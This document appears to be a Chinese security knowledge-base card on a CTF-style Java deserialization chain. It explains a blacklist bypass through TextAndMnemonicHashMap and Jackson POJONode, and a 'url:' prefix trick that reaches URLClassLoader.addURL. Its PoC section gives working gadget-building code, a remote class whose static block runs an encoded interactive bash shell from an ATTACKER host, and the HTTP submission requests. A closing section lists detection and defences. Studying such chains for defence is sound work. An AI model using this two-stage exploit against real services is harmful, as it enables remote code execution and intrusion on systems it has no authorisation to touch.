---
id: web-java-deserialization-pojo-getter-urlclassloader-uriprefix
title: Java 反序列化黑名单绕过：TextAndMnemonicHashMap 触发 POJONode.toString，Jackson 调用 getter 经 url 前缀绕过走 URLClassLoader.addURL 两段加载 RCE
type: scenario
domain: web
path: web/java/deserialization
technique: deser-pojo-getter-urlclassloader-uriprefix
aliases:
- ez_java
- POJONode getter 触发
- URLClassLoader.addURL 反序列化
- url 前缀绕过 startsWith
- TextAndMnemonicHashMap POJONode
- 两段式反序列化远程类加载
tags:
- java
- deserialization
- blacklist-bypass
- jackson
- pojonode
- swing
- urlclassloader
- getter
- rce
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-V276
  verified_at: '2026-11-08T00:37:27+08:00'
  notes: 已对照原文与 8 张图核对：img06 依赖 jackson 2.13.5/commons-beanutils 1.8.3/shiro/tomcat-embed 9.0.78；img07 JDK URL spec.regionMatches(true,start,"url:",0,4) 后 start+=4；img08 调试 User.getGift 输入 url:http://49.232.222.195:8000/exp.class、new URL 得 http://... 且 classloader=Launcher$AppClassLoader。已用本机 JDK8 javap 验证 javax.swing.UIDefaults$TextAndMnemonicHashMap.get 在 super.get==null 时对 key 调 toString，卡片 TextAndMnemonicHashMap 触发原理成立。已把『文章截图显示最终弹出计算器』修正为原文声称、文中无最终执行截图（confidence medium 合理）。dedup new，最接近的 HotSwappableTargetSource/XString 卡触发源与 sink 不同；dup-scan 无本篇 pair。
---

## 一句话结论

自定义 `ObjectInputStream` 只用类名前缀黑名单封禁 `Runtime`/`ProcessBuilder`/`TemplatesImpl`/`SignedObject`/`LdapAttribute`/commons-beanutils/commons-collections/`BadAttributeValueExpException`/`XString` 时，可用未被封禁的 `javax.swing.UIDefaults$TextAndMnemonicHashMap` 作为 HashMap 冲突键，在反序列化时触发 Jackson `POJONode.toString()`；后者经 `ObjectMapper` 序列化被包裹的 POJO 并调用其 getter（`User.getGift()`），反射执行 `URLClassLoader.addURL` 把攻击者 URL 加入系统类加载器；再发第二个序列化流（远程类的序列化实例），类解析时从该 URL 加载攻击者字节码并触发 static 初始化，两段式完成 RCE。`getGift()` 的 `startsWith("http"/"file")` 检查可用 `url:http://...` 绕过，因为 JDK `URL` 构造器会剥离前导 `url:`。

## 原理

- **入口与黑名单**：`/user/ser` 接收 base64 原生 Java 序列化流，交给重写了 `resolveClass` 的 `MyObjectInputStream`。黑名单按 `className.startsWith(...)` 在类解析阶段拒绝整包，因此 Runtime/ProcessBuilder/TemplatesImpl/SignedObject/LdapAttribute/commons-beanutils/commons-collections/BAVE/XString 这些常见链全部不可用，需要仅用未封禁类构造 toString 触发。
- **toString 触发源**：`javax.swing.UIDefaults$TextAndMnemonicHashMap` 是 HashMap 子类，其 `get(Object key)` 在 `super.get(key) == null` 时会对 key 调用 `toString()`。把两个内容相同的该类型 Map 作为外层 HashMap 的 key：两者 `AbstractMap.hashCode()` 相同，`HashMap.readObject` 重建时 `putVal` 发生哈希冲突，调用 `key.equals(existingKey)` → `AbstractMap.equals` 遍历 entry 并调用另一 Map 的 `m.get(key)` → `TextAndMnemonicHashMap.get(POJONode)` → `POJONode.toString()`。把内层 Map 中该 key 的 value 置为 null，是为了让 `get` 落入调用 `toString` 的分支。
- **任意 getter**：Jackson `POJONode.toString()` 走 `BaseJsonNode.toString` → `InternalNodeMapper.nodeToString` → `ObjectMapper.writeValueAsString`；序列化 `_value` 时按 Bean 规则调用 POJO 的 getter。文章把 `User` 包进 `POJONode`，于是 `User.getGift()` 被调用。
- **getter 内绕过前缀检查**：`getGift()` 先 `username.trim().toLowerCase()`，若以 `http`/`file` 开头则替换为 `nonono`；随后 `new URL(gift)` 并反射 `URLClassLoader.addURL`。JDK `java.net.URL` 构造器为兼容旧式写法，会在 `spec.regionMatches(true, start, "url:", 0, 4)` 为真时 `start += 4`，即 `new URL("url:http://host:8000")` 实际解析为 `http://host:8000`（本机 JDK8 验证 `getProtocol()==http`）。因此 `url:http://...` 既不匹配 `startsWith("http")`，又能得到合法 http URL。
- **addURL**：`ClassLoader.getSystemClassLoader()` 在应用启动器下是 `Launcher$AppClassLoader`（继承 `URLClassLoader`），反射调用其 `addURL` 后，系统类加载器搜索路径新增攻击者 HTTP 目录。
- **第二段**：攻击者服务器放置实现 `Serializable` 的类 `exp`（static 初始化块执行命令）。第二个序列化流是 `exp` 实例；`readObject` 的 `resolveClass` 让系统类加载器解析 `exp`，此时扩展后的 URLClassLoader 从 `http://attacker:8000/exp.class` 拉取字节码，类初始化执行命令。机会只有一次：类一旦加载，后续不会再从远程重复加载。
- **序列化侧细节**：构造 gadget 的 JVM 必须先移除 `com.fasterxml.jackson.databind.node.BaseJsonNode#writeReplace`（Javassist），否则 `POJONode` 序列化时会被 `writeReplace` 替换成字符串，流里不再保留可利用的 POJONode 对象。

## 触发条件

- 存在原生 Java 反序列化入口（base64 解码后 `ObjectInputStream.readObject`），攻击者可控制字节；黑名单为类名前缀/关键字枚举，未覆盖 `javax.swing`、Jackson 与自定义 POJO。
- classpath 含 jackson-databind（POJONode/BaseJsonNode/InternalNodeMapper）与带 Swing 的 JDK（`TextAndMnemonicHashMap`）。
- 存在一个可序列化 POJO，其 getter 会按攻击者可控字符串执行 URL 加载/映射（本场景 `User.getGift` → `URLClassLoader.addURL`），且前置过滤可用等价前缀绕过。
- 目标系统类加载器是 `URLClassLoader`（应用启动器常见），且目标能出网访问攻击者 HTTP 服务。
- 需要两次反序列化：第一次加入 URL，第二次触发远程类加载；第一次添加的 URL 必须在同一 JVM 内保持有效。

## 利用步骤

1. 识别反序列化入口与黑名单，确认 `javax.swing`、Jackson、自定义 POJO 未被拦截。
2. 构造 stage-1：Javassist 移除 `BaseJsonNode.writeReplace`；`User("url:http://ATTACKER:8000", ...)`；`POJONode(user)`；两个 `TextAndMnemonicHashMap` 各放入 `POJONode→value` 并把 value 置 null、`loadFactor=1`；外层 `HashMap` 放入两个 Map；序列化后 base64。
3. `POST /user/ser` 提交 stage-1，触发 `getGift()` → `addURL(http://ATTACKER:8000)`。
4. 在攻击者服务器放置 `exp.class`（或 `exp.jar`），编写实现 `Serializable` 且 static 块执行命令的类。
5. 序列化一个 `exp` 实例并 base64，再次 `POST /user/ser`；系统类加载器从攻击者 URL 加载 `exp`，static 初始化执行命令。
6. 通过命令回连/文件写入验证；失败时检查类是否已被本地同名类屏蔽或第一次 URL 未生效。

## PoC

stage-1 关键代码（Java）：

```java
CtClass ct = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
ct.removeMethod(ct.getDeclaredMethod("writeReplace"));
ct.toClass();  // 防止 POJONode 被 writeReplace 变成字符串

User user = new User("url:http://ATTACKER:8000", "admin888"); // getGift 内 new URL 实际为 http://ATTACKER:8000
POJONode node = new POJONode(user);

Map m1 = (Map) createWithoutConstructor(Class.forName("javax.swing.UIDefaults$TextAndMnemonicHashMap"));
Map m2 = (Map) createWithoutConstructor(Class.forName("javax.swing.UIDefaults$TextAndMnemonicHashMap"));
m1.put(node, "1"); m2.put(node, "1");
setField(m1, "loadFactor", 1.0f); setField(m2, "loadFactor", 1.0f);

HashMap outer = new HashMap();
outer.put(m1, "1"); outer.put(m2, "1");
setInnerValueToNull(m1, node); setInnerValueToNull(m2, node); // 触发 TextAndMnemonicHashMap.get -> node.toString()

System.out.println(Base64.getEncoder().encodeToString(serialize(outer)));
```

stage-2 远程类（需放在 `http://ATTACKER:8000/exp.class`）：

```java
public class exp implements Serializable {
    static {
        try { Runtime.getRuntime().exec("bash -c {echo,BASE64}|{base64,-d}|{bash,-i}"); }
        catch (Exception e) { throw new RuntimeException(e); }
    }
}
```

```http
POST /user/ser HTTP/1.1
Content-Type: application/x-www-form-urlencoded

ser=<base64(stage1)>
```

随后再提交 `ser=<base64(serialize(new exp()))>`。原文称第二段反序列化加载该远程类时会触发 static 初始化并执行命令，但文中未给出最终弹窗/命令回显截图，本卡未复跑。

## 变体与关联

- **jar 协议**：`User("jar:http://ATTACKER:8000/exp.jar!/", ...)`，`jar:` 不匹配 `startsWith("http"/"file")`，无需 `url:` 技巧；URLClassLoader 可从远程 jar 加载类。
- **toString 源变体**：外层用 Hashtable + TextAndMnemonicHashMap 是另一条 toString 触发链；若 `javax.swing` 也被封禁，可用 Spring AOP `HotSwappableTargetSource` + `XString` 触发 POJONode.toString。
- **getter sink 变体**：任何可序列化且 getter 带危险副作用的类（URL 加载、JNDI lookup、文件读写、反射调用）都可替换 `User.getGift`；POJONode 提供“反序列化时调任意 getter”的能力。
- **`url:` 前缀**：凡“先 `startsWith("http"/"file")` 过滤、再 `new URL(str)`”的写法都可尝试 `url:http://...`/`url:file://...`，JDK URL 构造器会剥离前导 `url:`。
- 关联：Jackson POJONode 黑名单链、TextAndMnemonicHashMap toString 链、C3P0 URLClassLoader 远程类加载链。

## 检测与防御

- 禁止原生 Java 反序列化；必须使用时用 `ObjectInputFilter` 白名单（JEP 290），不要用类名前缀黑名单。
- 监控 base64 解码后的 `AC ED 00 05` 流、类名 `POJONode`/`TextAndMnemonicHashMap`、`BaseJsonNode.writeReplace` 缺失的异常流。
- 限制应用出网；监控系统类加载器从 HTTP 拉取 class、`URLClassLoader.addURL` 调用与运行期 defineClass。
- 修复 getter 内的 URL 加载逻辑：先解析 URL 再按 `getProtocol()` 做协议白名单，不要用原始字符串 `startsWith`；禁止把用户输入加入类加载器搜索路径。
